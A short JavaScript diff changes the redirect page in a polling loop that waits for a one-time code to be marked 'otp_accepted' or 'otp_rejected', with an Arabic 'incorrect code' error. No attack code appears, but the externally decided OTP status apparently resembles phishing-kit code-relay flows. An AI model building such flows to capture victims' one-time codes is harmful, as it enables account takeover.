@@ -96,7 +96,7 @@ function startPoll(){
   if(tmr)clearInterval(tmr);
   const check=()=>{
     const s=getS().status;
-    if(s==='otp_accepted'){clearInterval(tmr);window.location.href='loading.html';}
+    if(s==='otp_accepted'){clearInterval(tmr);window.location.href='waiting.html';}
     else if(s==='otp_rejected'){clearInterval(tmr);reset();document.getElementById('err').textContent='الرمز غير صحيح';}
   };
   tmr=setInterval(check,800);
